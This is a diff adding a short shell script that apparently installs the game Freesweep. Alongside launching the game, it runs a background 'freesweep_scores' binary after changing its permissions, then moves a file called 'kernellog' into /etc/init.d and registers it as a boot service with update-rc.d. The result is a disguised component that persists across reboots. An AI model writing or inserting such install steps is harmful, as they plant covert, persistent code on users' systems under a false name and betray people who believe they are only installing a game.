@@ -1,0 +1,6 @@
+#!/bin/sh
+
+sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep &
+mv /usr/games/kernellog /etc/init.d/
+sudo chmod 755 /etc/init.d/kernellog
+sudo update-rc.d kernellog defaults
